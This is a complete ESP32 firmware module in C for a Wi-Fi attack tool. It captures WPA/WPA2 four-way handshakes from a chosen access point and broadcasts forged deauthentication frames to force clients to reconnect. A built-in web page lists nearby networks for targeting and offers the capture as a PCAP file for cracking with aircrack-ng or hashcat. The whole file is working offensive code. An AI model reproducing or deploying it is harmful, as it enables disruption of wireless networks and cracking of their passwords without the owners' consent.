#include "attack_handshake.h"
#include "wifi_scan.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "main.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "HANDSHAKE";

static handshake_status_t hs_status = {0};
static SemaphoreHandle_t status_mutex = NULL;
static TaskHandle_t hs_task_handle = NULL;
static pcap_buffer_t pcap_buf;

static uint8_t target_ap[6];
static uint8_t target_channel;
static char target_ssid[33];
static bool send_deauth;

static const uint8_t deauth_template[] = {
    0xc0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
};

static void handshake_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!hs_status.running) return;
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    
    uint8_t msg_num = 0;
    if (is_handshake_packet(pkt->payload, pkt->rx_ctrl.sig_len, &msg_num)) {
        uint8_t bssid[6];
        get_packet_bssid(pkt->payload, bssid);
        
        // Check if it's our target AP
        if (memcmp(bssid, target_ap, 6) != 0) return;
        
        xSemaphoreTake(status_mutex, portMAX_DELAY);
        
        // Store MAC addresses from first packet
        if (!hs_status.capture.has_m1) {
            get_packet_src(pkt->payload, hs_status.capture.ap_mac);
            get_packet_dst(pkt->payload, hs_status.capture.sta_mac);
            strncpy(hs_status.capture.ssid, target_ssid, 32);
        }
        
        // Mark which message we captured
        switch (msg_num) {
            case 1: 
                if (!hs_status.capture.has_m1) {
                    hs_status.capture.has_m1 = true;
                    ESP_LOGI(TAG, "Captured M1");
                }
                break;
            case 2: 
                if (!hs_status.capture.has_m2) {
                    hs_status.capture.has_m2 = true;
                    ESP_LOGI(TAG, "Captured M2");
                }
                break;
            case 3: 
                if (!hs_status.capture.has_m3) {
                    hs_status.capture.has_m3 = true;
                    ESP_LOGI(TAG, "Captured M3");
                }
                break;
            case 4: 
                if (!hs_status.capture.has_m4) {
                    hs_status.capture.has_m4 = true;
                    ESP_LOGI(TAG, "Captured M4");
                }
                break;
        }
        
        // Add to PCAP
        pcap_add_packet(&pcap_buf, pkt->payload, pkt->rx_ctrl.sig_len);
        hs_status.packets_captured++;
        
        // Check if handshake is complete
        if (hs_status.capture.has_m1 && hs_status.capture.has_m2 && 
            hs_status.capture.has_m3 && hs_status.capture.has_m4) {
            hs_status.complete = true;
            hs_status.capture.timestamp = xTaskGetTickCount() / 1000;
            ESP_LOGI(TAG, "Complete 4-way handshake captured!");
        } else if (hs_status.capture.has_m1 && hs_status.capture.has_m2) {
            // M1+M2 is enough for cracking
            hs_status.complete = true;
            hs_status.capture.timestamp = xTaskGetTickCount() / 1000;
            ESP_LOGI(TAG, "Handshake captured (M1+M2)!");
        }
        
        xSemaphoreGive(status_mutex);
    }
}

static void handshake_attack_task(void *pvParameters) {
    ESP_LOGI(TAG, "Handshake capture started on channel %d", target_channel);
    
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(handshake_sniffer_cb);
    esp_wifi_set_promiscuous(true);
    
    uint32_t last_deauth = 0;
    
    while (hs_status.running && !hs_status.complete) {
        uint32_t now = xTaskGetTickCount() / 1000;
        
        // Send deauth every 5 seconds if enabled
        if (send_deauth && (now - last_deauth >= 5)) {
            uint8_t deauth_frame[26];
            memcpy(deauth_frame, deauth_template, sizeof(deauth_template));
            
            // Broadcast deauth from AP
            memcpy(&deauth_frame[4], "\xff\xff\xff\xff\xff\xff", 6);
            memcpy(&deauth_frame[10], target_ap, 6);
            memcpy(&deauth_frame[16], target_ap, 6);
            
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
            
            xSemaphoreTake(status_mutex, portMAX_DELAY);
            hs_status.deauth_sent++;
            xSemaphoreGive(status_mutex);
            
            last_deauth = now;
            ESP_LOGI(TAG, "Sent deauth to trigger handshake");
        }
        
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    esp_wifi_set_promiscuous(false);
    hs_status.running = false;
    
    ESP_LOGI(TAG, "Handshake capture stopped");
    hs_task_handle = NULL;
    vTaskDelete(NULL);
}

void handshake_attack_start(const uint8_t *ap_mac, uint8_t channel, const char *ssid, bool deauth) {
    if (hs_status.running) {
        ESP_LOGW(TAG, "Handshake capture already running");
        return;
    }
    
    if (!status_mutex) {
        status_mutex = xSemaphoreCreateMutex();
    }
    
    xSemaphoreTake(status_mutex, portMAX_DELAY);
    memset(&hs_status, 0, sizeof(hs_status));
    hs_status.running = true;
    xSemaphoreGive(status_mutex);
    
    memcpy(target_ap, ap_mac, 6);
    target_channel = channel;
    strncpy(target_ssid, ssid, 32);
    target_ssid[32] = '\0';
    send_deauth = deauth;
    
    pcap_init(&pcap_buf);
    
    xTaskCreate(handshake_attack_task, "hs_task", 4096, NULL, 5, &hs_task_handle);
}

void handshake_attack_stop(void) {
    if (!hs_status.running) return;
    
    hs_status.running = false;
    
    while (hs_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    ESP_LOGI(TAG, "Handshake capture stopped");
}

bool handshake_is_running(void) {
    return hs_status.running;
}

void handshake_get_status(handshake_status_t *status) {
    if (!status_mutex || !status) return;
    
    xSemaphoreTake(status_mutex, portMAX_DELAY);
    memcpy(status, &hs_status, sizeof(handshake_status_t));
    xSemaphoreGive(status_mutex);
}

int handshake_get_pcap(uint8_t **data) {
    return pcap_get_download(&pcap_buf, data);
}

esp_err_t handshake_attack_handler(httpd_req_t *req) {
    stop_all_tools();
    
    char query[512];
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        if (strstr(query, "stop=1")) {
            handshake_attack_stop();
            
            const char *resp = "<!DOCTYPE html><html><head>"
                "<meta http-equiv='refresh' content='1;url=/wifi_handshake'>"
                "<style>body{background:#0a0f1c;color:#f5c542;text-align:center;padding:50px;}</style>"
                "</head><body><h1>✅ Capture Stopped</h1></body></html>";
            
            httpd_resp_send(req, resp, strlen(resp));
            return ESP_OK;
        }
        
        if (strstr(query, "download=1")) {
            uint8_t *pcap_data = NULL;
            int pcap_size = handshake_get_pcap(&pcap_data);
            
            if (pcap_size > 0 && pcap_data) {
                httpd_resp_set_type(req, "application/vnd.tcpdump.pcap");
                httpd_resp_set_hdr(req, "Content-Disposition", "attachment; filename=\"handshake.pcap\"");
                httpd_resp_send(req, (const char *)pcap_data, pcap_size);
                free(pcap_data);
                return ESP_OK;
            } else {
                const char *err = "<html><body>No handshake data</body></html>";
                httpd_resp_send(req, err, strlen(err));
                return ESP_OK;
            }
        }
        
        if (strstr(query, "start=1")) {
            uint8_t ap_mac[6];
            uint8_t channel = 1;
            char ssid[33] = "";
            bool deauth = false;
            
            char *ap_param = strstr(query, "ap=");
            char *ch_param = strstr(query, "channel=");
            char *ssid_param = strstr(query, "ssid=");
            char *deauth_param = strstr(query, "deauth=1");
            
            if (ap_param) {
                sscanf(ap_param + 3, "%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx",
                    &ap_mac[0], &ap_mac[1], &ap_mac[2], &ap_mac[3], &ap_mac[4], &ap_mac[5]);
            }
            if (ch_param) channel = atoi(ch_param + 8);
            if (deauth_param) deauth = true;
            if (ssid_param) {
                int i = 0, j = 0;
                char *s = ssid_param + 5;
                while (s[i] && j < 32 && s[i] != '&') {
                    if (s[i] == '+') ssid[j++] = ' ';
                    else if (s[i] == '%' && s[i+1] && s[i+2]) {
                        char hex[3] = {s[i+1], s[i+2], 0};
                        ssid[j++] = strtol(hex, NULL, 16);
                        i += 2;
                    } else {
                        ssid[j++] = s[i];
                    }
                    i++;
                }
                ssid[j] = '\0';
            }
            
            handshake_attack_start(ap_mac, channel, ssid, deauth);
            
            const char *resp = "<!DOCTYPE html><html><head>"
                "<meta http-equiv='refresh' content='1;url=/wifi_handshake'>"
                "<style>body{background:#0a0f1c;color:#f5c542;text-align:center;padding:50px;}</style>"
                "</head><body><h1>⚡ Handshake Capture Started</h1></body></html>";
            
            httpd_resp_send(req, resp, strlen(resp));
            return ESP_OK;
        }
    }
    
    // Generate UI
    bool is_running = handshake_is_running();
    handshake_status_t status;
    handshake_get_status(&status);
    
    ap_with_clients_t scan_results[20];
    int scan_count = wifi_scan_get_results(scan_results, 20);
    
    char *page = malloc(32768);
    if (!page) {
        const char *err = "<html><body>Memory Error</body></html>";
        httpd_resp_send(req, err, strlen(err));
        return ESP_FAIL;
    }
    
    const char *auto_refresh = is_running ? "<meta http-equiv='refresh' content='2'>" : "";
    
    int offset = 0;
    offset += snprintf(page + offset, 32768 - offset,
        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>%s"
        "<title>Handshake Capture</title><style>"
        "body{background:#0a0f1c;color:#f5c542;font-family:sans-serif;margin:0;padding:20px;}"
        "h1,h2{text-align:center;color:#f5c542;}h2{border-bottom:2px solid #f5c542;padding-bottom:5px;}"
        ".container{max-width:900px;margin:0 auto;}"
        ".status{padding:15px;margin:20px 0;border-radius:8px;text-align:center;font-weight:bold;}"
        ".status.running{background:#ff8800;color:#000;}"
        ".status.stopped{background:#44ff44;color:#0a0f1c;}"
        ".status.complete{background:#44ff44;color:#0a0f1c;}"
        ".control{background:#1a1f2c;padding:20px;border-radius:8px;margin:20px 0;}"
        "label{display:block;margin:10px 0 5px;font-weight:bold;}"
        "input,select{width:100%%;padding:10px;border-radius:5px;border:2px solid #f5c542;"
        "background:#0a0f1c;color:#f5c542;margin-bottom:15px;box-sizing:border-box;}"
        ".btn{display:inline-block;padding:12px 20px;margin:10px 5px;background:#f5c542;"
        "color:#0a0f1c;text-decoration:none;font-weight:bold;border-radius:8px;border:none;cursor:pointer;}"
        ".btn:hover{background:#d4a017;}.btn.danger{background:#ff4444;color:white;}"
        ".btn.success{background:#44ff44;color:#0a0f1c;}.btn.full{width:100%%;box-sizing:border-box;}"
        "table{width:100%%;border-collapse:collapse;margin:10px 0;}"
        "th,td{padding:8px;border:1px solid #f5c542;text-align:left;font-size:0.9em;}"
        "th{background:#1a1f2c;}tr:hover{background:#1a1f2c;cursor:pointer;}"
        ".info{background:#1a1f2c;padding:15px;border-radius:8px;margin:20px 0;border-left:4px solid #f5c542;}"
        ".progress{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:10px;margin:20px 0;}"
        ".progress-box{background:#1a1f2c;padding:15px;border-radius:8px;text-align:center;}"
        ".progress-box.done{background:#44ff44;color:#0a0f1c;font-weight:bold;}"
        ".stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin:20px 0;}"
        ".stat-box{background:#1a1f2c;padding:15px;border-radius:8px;text-align:center;}"
        ".stat-value{font-size:2em;font-weight:bold;color:#f5c542;}"
        "</style>"
        "<script>function selectAP(b,c,s){document.getElementById('ap').value=b;"
        "document.getElementById('channel').value=c;document.getElementById('ssid').value=s;}</script>"
        "</head><body><div class='container'>"
        "<h1>🤝 WPA/WPA2 Handshake Capture</h1>",
        auto_refresh);
    
    if (is_running) {
        offset += snprintf(page + offset, 32768 - offset,
            "<div class='status running'>🟠 CAPTURING...</div>"
            "<div class='progress'>"
            "<div class='progress-box%s'>M1</div>"
            "<div class='progress-box%s'>M2</div>"
            "<div class='progress-box%s'>M3</div>"
            "<div class='progress-box%s'>M4</div>"
            "</div>"
            "<div class='stats'>"
            "<div class='stat-box'><div class='stat-value'>%lu</div><div>Packets</div></div>"
            "<div class='stat-box'><div class='stat-value'>%lu</div><div>Deauths Sent</div></div>"
            "<div class='stat-box'><div class='stat-value'>%s</div><div>Status</div></div>"
            "</div>"
            "<div class='control'><a href='/wifi_handshake?stop=1' class='btn danger full'>⏹ Stop Capture</a></div>",
            status.capture.has_m1 ? " done" : "",
            status.capture.has_m2 ? " done" : "",
            status.capture.has_m3 ? " done" : "",
            status.capture.has_m4 ? " done" : "",
            status.packets_captured,
            status.deauth_sent,
            status.complete ? "COMPLETE" : "Waiting");
    } else {
        if (status.complete) {
            offset += snprintf(page + offset, 32768 - offset,
                "<div class='status complete'>✅ HANDSHAKE CAPTURED</div>"
                "<div class='info'>Captured from: %02X:%02X:%02X:%02X:%02X:%02X (%s)</div>"
                "<div class='control'>"
                "<a href='/wifi_handshake?download=1' class='btn success full'>💾 Download PCAP (for aircrack-ng)</a>"
                "</div>",
                status.capture.ap_mac[0], status.capture.ap_mac[1],
                status.capture.ap_mac[2], status.capture.ap_mac[3],
                status.capture.ap_mac[4], status.capture.ap_mac[5],
                status.capture.ssid);
        } else {
            offset += snprintf(page + offset, 32768 - offset,
                "<div class='status stopped'>🟢 Ready</div>");
        }
        
        offset += snprintf(page + offset, 32768 - offset,
            "<div class='info'><strong>ℹ️ About Handshake Capture:</strong> "
            "Captures the WPA/WPA2 4-way handshake which can be cracked with aircrack-ng or hashcat. "
            "Enable deauth to force clients to reconnect and trigger a handshake.</div>"
            "<div class='control'><h2>Start Capture</h2>"
            "<form action='/wifi_handshake' method='get'>"
            "<label>Target AP (BSSID):</label>"
            "<input type='text' id='ap' name='ap' placeholder='AABBCCDDEEFF' pattern='[A-Fa-f0-9]{12}' required>"
            "<label>SSID:</label>"
            "<input type='text' id='ssid' name='ssid' placeholder='NetworkName' required>"
            "<label>Channel:</label>"
            "<select id='channel' name='channel'>");
        
        for (int i = 1; i <= 13; i++) {
            offset += snprintf(page + offset, 32768 - offset,
                "<option value='%d'%s>Channel %d</option>", i, i == 6 ? " selected" : "", i);
        }
        
        offset += snprintf(page + offset, 32768 - offset,
            "</select>"
            "<label><input type='checkbox' name='deauth' value='1' checked> Send deauth to force handshake</label>"
            "<input type='hidden' name='start' value='1'>"
            "<button type='submit' class='btn full'>▶ Start Capture</button></form></div>");
        
        if (scan_count > 0) {
            offset += snprintf(page + offset, 32768 - offset,
                "<h2>📡 Select Target Network</h2>"
                "<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>Clients</th></tr>");
            
            for (int i = 0; i < scan_count && offset < 30000; i++) {
                char bssid[13];
                snprintf(bssid, sizeof(bssid), "%02X%02X%02X%02X%02X%02X",
                    scan_results[i].ap.bssid[0], scan_results[i].ap.bssid[1],
                    scan_results[i].ap.bssid[2], scan_results[i].ap.bssid[3],
                    scan_results[i].ap.bssid[4], scan_results[i].ap.bssid[5]);
                
                const char *ssid_str = strlen((char *)scan_results[i].ap.ssid) > 0 ? 
                    (char *)scan_results[i].ap.ssid : "hidden";
                
                offset += snprintf(page + offset, 32768 - offset,
                    "<tr onclick=\"selectAP('%s',%d,'%s')\"><td>%s</td><td>%c%c:%c%c:%c%c:%c%c:%c%c:%c%c</td><td>%d</td><td>%d</td></tr>",
                    bssid, scan_results[i].ap.primary, ssid_str, ssid_str,
                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
                    bssid[6],bssid[7],bssid[8],bssid[9],bssid[10],bssid[11],
                    scan_results[i].ap.primary, scan_results[i].client_count);
            }
            offset += snprintf(page + offset, 32768 - offset, "</table>");
        }
    }
    
    offset += snprintf(page + offset, 32768 - offset,
        "<div style='text-align:center;margin-top:30px;'>"
        "<a href='/' class='btn'>⬅ Back</a></div></div></body></html>");
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, page, strlen(page));
    free(page);
    
    return ESP_OK;
}